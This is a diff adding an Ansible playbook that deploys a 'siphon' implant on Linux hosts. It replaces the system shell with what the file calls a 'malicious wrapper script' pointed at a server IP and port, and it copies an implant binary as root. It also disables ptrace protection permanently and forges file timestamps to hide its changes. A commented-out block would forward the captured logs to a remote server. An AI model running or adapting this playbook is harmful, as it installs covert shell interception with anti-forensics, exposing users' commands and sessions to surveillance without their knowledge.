@@ -1,0 +1,149 @@
+---
+#- name: Gather system facts. Needed for OS architecture
+#  ansible.builtin.setup:
+
+# Set in group vars
+#- name: Define variables for paths and filenames
+#  set_fact:
+
+- name: Get original timestamps of {{ siphon_file_old_path }}
+  command: stat -c "%y %z" {{ siphon_file_old_path }}
+  register: bash_timestamps
+  changed_when: false
+
+# TODO: prepend with . to hide 
+- name: Move {{ siphon_file_old_path }} to {{ siphon_file_new_path }}
+  command: mv {{ siphon_file_old_path }} {{ siphon_file_new_path }}
+  args:
+    creates: "{{ siphon_file_new_path }}"
+
+- name: Ensure destination directory exists
+  ansible.builtin.file:
+    path: "{{ siphon_path | dirname }}"
+    state: directory
+    owner: root
+    group: root
+    mode: '0755'
+
+- name: Copy siphon based on architecture
+  copy:
+    src: "files/siphon-linux-{{ ansible_architecture }}"
+    dest: "{{ siphon_path }}"
+    owner: root
+    group: root
+    mode: '0755'
+  when: ansible_architecture in ['x86_64', 'i386', 'armv7l', 'aarch64']
+
+- name: Handle architecture-specific siphon versions
+  debug:
+    msg: "Selected siphon version: files/siphon-linux-{{ ansible_architecture }}"
+
+- name: Copy malicious wrapper script to {{ siphon_file_old_path }}
+  copy:
+    src: files/bash_wrapper.sh
+    dest: "{{ siphon_file_old_path }}"
+    owner: root
+    group: root
+    mode: '0755'
+
+- name: Replace bash path in the script
+  ansible.builtin.replace:
+    path: "{{ siphon_file_old_path }}"
+    regexp: '/bin/ash'
+    replace: '{{ siphon_file_new_path }}'
+
+- name: Replace siphon path in the script
+  ansible.builtin.replace:
+    path: "{{ siphon_file_old_path }}"
+    regexp: '/bin/siphon0'
+    replace: '{{ siphon_path  }}'
+
+- name: Replace server IP in the script
+  ansible.builtin.replace:
+    path: "{{ siphon_file_old_path }}"
+    regexp: 'SERVER_IP'
+    replace: '{{ siphon_server_ip }}'
+
+- name: Replace server port in the script
+  ansible.builtin.replace:
+    path: "{{ siphon_file_old_path }}"
+    regexp: 'PORT'
+    replace: '{{ siphon_server_port }}'
+
+- name: Replace logfile location in the script
+  ansible.builtin.replace:
+    path: "{{ siphon_file_old_path }}"
+    regexp: '/outputfile'
+    replace: '{{ siphon_logfile_path }}'
+
+- name: Check current ptrace_scope value
+  command: cat /proc/sys/kernel/yama/ptrace_scope
+  register: ptrace_scope_value
+  changed_when: false
+  ignore_errors: true
+
+- name: Set ptrace_scope to 0 temporarily
+  command: echo 0 | tee /proc/sys/kernel/yama/ptrace_scope
+  when: ptrace_scope_value.stdout != "0"
+  notify:
+    - reload sysctl
+
+- name: Ensure ptrace_scope is set to 0 permanently - needed for non-root users to be able to use this
+  lineinfile:
+    path: /etc/sysctl.d/10-ptrace.conf
+    regexp: '^kernel\.yama\.ptrace_scope'
+    line: 'kernel.yama.ptrace_scope = 0'
+    create: yes
+
+- name: Apply sysctl changes
+  command: sysctl -p
+
+# RSYSLOG CONFIG
+# TODO - firewall?
+#- name: Install rsyslog
+#  ansible.builtin.apt:
+#    name: rsyslog
+#    state: present
+
+#- name: Ensure rsyslog service is running
+#  ansible.builtin.service:
+#    name: rsyslog
+#    state: started
+#    enabled: yes
+
+#- name: Configure rsyslog to send logfile to Graylog
+#  ansible.builtin.copy:
+#    dest: /etc/rsyslog.d/01-glogging.conf
+#    content: |
+#      input(type="imfile"
+#            File="{{ siphon_logfile_path }}"
+#            Tag="custom_log"
+#            Severity="info"
+#            Facility="local7")
+#
+#      # Output: Forward logs to Graylog server
+#      *.* @{{ siphon_server_ip }}:{{ siphon_server_port }}
+#    owner: root
+#    group: root
+#    mode: '0644'
+
+#- name: Restart rsyslog
+#  ansible.builtin.service:
+#    name: rsyslog
+#    state: restarted
+
+# Verify config
+# journalctl -f -u rsyslog
+
+# Cleanup
+- name: Apply original timestamps to wrapper
+  command: >
+    touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ siphon_file_new_path }}
+
+- name: Apply original timestamps to new {{ siphon_file_old_path }}
+  command: >
+    touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ siphon_file_old_path }}
+
+- name: Apply original timestamps to siphon
+  command: >
+    touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ siphon_path }}
